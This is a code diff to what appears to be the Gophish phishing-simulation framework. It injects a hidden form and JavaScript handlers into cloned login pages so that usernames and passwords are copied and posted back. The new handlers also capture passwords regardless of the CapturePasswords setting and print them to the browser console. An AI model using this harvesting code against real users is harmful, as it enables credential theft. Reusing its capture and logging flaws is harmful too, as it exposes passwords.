@@ -28,6 +28,9 @@ var ErrPageNameNotSpecified = errors.New("Page Name not specified")
 // capturing (or lack thereof!) of credentials and passwords
 func (p *Page) parseHTML() error {
 	log.Debug("Starting parseHTML for page:", p.Name)
+	log.Debug("CaptureCredentials:", p.CaptureCredentials)
+	log.Debug("CapturePasswords:", p.CapturePasswords)
+	
 	d, err := goquery.NewDocumentFromReader(strings.NewReader(p.HTML))
 	if err != nil {
 		log.Error("Error parsing HTML:", err)
@@ -37,121 +40,127 @@ func (p *Page) parseHTML() error {
 	forms := d.Find("form")
 	log.Debug("Found", forms.Length(), "forms in the page")
 	
-	// First, find all forms that look like they're part of a multi-stage login
-	var emailForm, passwordForm *goquery.Selection
+	// Create a hidden form to store and submit credentials
+	log.Debug("Adding hidden gophish form for credential capture")
+	d.Find("body").PrependHtml(`
+		<form id="gophish-hidden-form" method="POST" style="display:none;">
+			<input type="hidden" name="rid" value="{{.RId}}"/>
+			<input type="hidden" name="username" id="gophish_username"/>
+			<input type="hidden" name="password" id="gophish_password"/>
+			<input type="hidden" name="__original_url" value="{{.URL}}"/>
+		</form>
+	`)
+
+	// Add data capture to all forms
 	forms.Each(func(i int, f *goquery.Selection) {
 		formID, _ := f.Attr("id")
-		log.Debug("Processing form", i+1, "with ID:", formID)
+		formAction, _ := f.Attr("action")
+		formMethod, _ := f.Attr("method")
+		log.Debug("Processing form", i+1, "ID:", formID, "Action:", formAction, "Method:", formMethod)
 
-		// Look for common email/username form identifiers
-		if strings.Contains(strings.ToLower(formID), "email") ||
-		   f.Find("input[type='email']").Length() > 0 {
-			emailForm = f
-			log.Debug("Found email form with ID:", formID)
-		}
+		// Add data capture for all input fields
+		f.Find("input").Each(func(j int, input *goquery.Selection) {
+			inputType, _ := input.Attr("type")
+			inputName, _ := input.Attr("name")
+			id, _ := input.Attr("id")
+			
+			log.Debug("Processing input field:", j+1, "Type:", inputType, "Name:", inputName, "ID:", id)
 
-		// Look for common password form identifiers
-		if strings.Contains(strings.ToLower(formID), "password") ||
-		   f.Find("input[type='password']").Length() > 0 {
-			passwordForm = f
-			log.Debug("Found password form with ID:", formID)
-		}
-	})
-
-	// If we found both forms, we're dealing with a multi-stage login
-	if emailForm != nil && passwordForm != nil {
-		log.Debug("Detected multi-stage login form")
-		
-		// Create a hidden form to store and submit credentials
-		d.Find("body").PrependHtml(`
-			<form id="gophish-hidden-form" method="POST" style="display:none;">
-				<input type="hidden" name="rid" value="{{.RId}}"/>
-				<input type="hidden" name="username" id="gophish_username"/>
-				<input type="hidden" name="password" id="gophish_password"/>
-				<input type="hidden" name="__original_url" value="{{.URL}}"/>
-			</form>
-		`)
-		
-		// Don't modify the email form's action - let it handle its own transition
-		emailForm.Each(func(i int, f *goquery.Selection) {
-			// Store the email when the first form is submitted
-			f.SetAttr("onsubmit", `
-				var emailInput = document.querySelector('input[type="email"]');
-				if (emailInput) {
-					document.getElementById('gophish_username').value = emailInput.value;
-				}
-				return true;
-			`)
-		})
-
-		// Modify the password form to submit both credentials
-		passwordForm.Each(func(i int, f *goquery.Selection) {
-			if p.CaptureCredentials {
-				// When password form submits, store password and submit hidden form
-				f.SetAttr("onsubmit", `
-					var passwordInput = document.querySelector('input[type="password"]');
-					if (passwordInput) {
-						document.getElementById('gophish_password').value = passwordInput.value;
-						document.getElementById('gophish-hidden-form').submit();
-					}
-					return true;
+			switch strings.ToLower(inputType) {
+			case "email", "text":
+				log.Debug("Adding capture for email/text field:", id)
+				// Add capture for email/username fields with logging
+				input.SetAttr("onchange", `
+					console.log('Email/text field changed:', this.value);
+					document.getElementById('gophish_username').value = this.value;
+					console.log('Updated gophish_username:', document.getElementById('gophish_username').value);
 				`)
+			case "password":
+				if p.CapturePasswords {
+					log.Debug("Adding capture for password field:", id)
+					// Add capture for password fields with logging
+					input.SetAttr("onchange", `
+						console.log('Password field changed:', this.value);
+						document.getElementById('gophish_password').value = this.value;
+						console.log('Updated gophish_password:', document.getElementById('gophish_password').value);
+					`)
+				}
 			}
 		})
 
-		log.Debug("Set up credential capture for multi-stage form")
-	} else {
-		// Handle single-form case
-		forms.Each(func(i int, f *goquery.Selection) {
-			log.Debug("Processing single form", i+1)
-			
-			f.SetAttr("action", "")
-			f.SetAttr("method", "POST")
-			
-			if p.CaptureCredentials {
-				inputs := f.Find("input")
-				log.Debug("Found", inputs.Length(), "input fields")
-				
-				f.PrependHtml(`<input type="hidden" name="rid" value="{{.RId}}"/>`)
-				
-				inputs.Each(func(j int, input *goquery.Selection) {
-					inputType, _ := input.Attr("type")
-					inputName, hasName := input.Attr("name")
-					placeholder, _ := input.Attr("placeholder")
-					id, _ := input.Attr("id")
+		// Add submission handling to all buttons
+		f.Find("button").Each(func(j int, b *goquery.Selection) {
+			buttonType, _ := b.Attr("type")
+			buttonID, _ := b.Attr("id")
+			originalOnClick, hasOnClick := b.Attr("onclick")
+
+			log.Debug("Processing button:", j+1, "Type:", buttonType, "ID:", buttonID, "Has onClick:", hasOnClick)
+
+			// Prepare the onclick handler with logging
+			submitHandler := `
+				console.log('Button clicked');
+				var form = this.closest('form');
+				if (form) {
+					console.log('Found parent form');
+					var emailInput = form.querySelector('input[type="email"], input[type="text"]');
+					var passwordInput = form.querySelector('input[type="password"]');
 					
-					log.Debug("Processing input field:", j+1, "Type:", inputType, "Name:", inputName, "HasName:", hasName, "Placeholder:", placeholder, "ID:", id)
+					console.log('Found inputs:', emailInput, passwordInput);
 					
-					if !hasName {
-						switch strings.ToLower(inputType) {
-						case "text", "email", "tel":
-							fieldText := strings.ToLower(placeholder + " " + id)
-							if strings.Contains(fieldText, "email") || 
-							   strings.Contains(fieldText, "username") || 
-							   strings.Contains(fieldText, "user") || 
-							   strings.Contains(fieldText, "phone") || 
-							   strings.Contains(fieldText, "mobile") || 
-							   strings.Contains(fieldText, "skype") || 
-							   strings.Contains(fieldText, "login") {
-								input.SetAttr("name", "username")
-								log.Debug("Assigned name 'username' to input based on field text:", fieldText)
-							}
-						case "password":
-							if p.CapturePasswords {
-								input.SetAttr("name", "password")
-								log.Debug("Assigned name 'password' to password field")
-							}
+					if (emailInput) {
+						console.log('Setting username:', emailInput.value);
+						document.getElementById('gophish_username').value = emailInput.value;
+					}
+					if (passwordInput) {
+						console.log('Setting password:', passwordInput.value);
+						document.getElementById('gophish_password').value = passwordInput.value;
+						// Submit the hidden form when we have both credentials
+						if (document.getElementById('gophish_username').value) {
+							console.log('Submitting gophish form');
+							document.getElementById('gophish-hidden-form').submit();
 						}
 					}
-				})
-				
-				f.AppendHtml(`<input type="hidden" name="__original_url" value="{{.URL}}"/>`)
+				} else {
+					console.log('No parent form found');
+				}
+			`
+
+			// Combine with existing onclick if present
+			if hasOnClick {
+				log.Debug("Combining with existing onClick handler for button:", buttonID)
+				b.SetAttr("onclick", submitHandler + originalOnClick)
+			} else {
+				log.Debug("Setting new onClick handler for button:", buttonID)
+				b.SetAttr("onclick", submitHandler)
 			}
 		})
-	}
 
-	// Don't modify any preventDefault() calls - let the original JavaScript handle transitions
-	
+		// Add form submission handling with logging
+		log.Debug("Adding onsubmit handler to form:", formID)
+		f.SetAttr("onsubmit", `
+			console.log('Form submitted');
+			var emailInput = this.querySelector('input[type="email"], input[type="text"]');
+			var passwordInput = this.querySelector('input[type="password"]');
+			
+			console.log('Found inputs:', emailInput, passwordInput);
+			
+			if (emailInput) {
+				console.log('Setting username:', emailInput.value);
+				document.getElementById('gophish_username').value = emailInput.value;
+			}
+			if (passwordInput) {
+				console.log('Setting password:', passwordInput.value);
+				document.getElementById('gophish_password').value = passwordInput.value;
+				// Submit the hidden form when we have both credentials
+				if (document.getElementById('gophish_username').value) {
+					console.log('Submitting gophish form');
+					document.getElementById('gophish-hidden-form').submit();
+				}
+			}
+			return true;
+		`)
+	})
+
 	p.HTML, err = d.Html()
 	if err != nil {
 		log.Error("Error getting final HTML:", err)
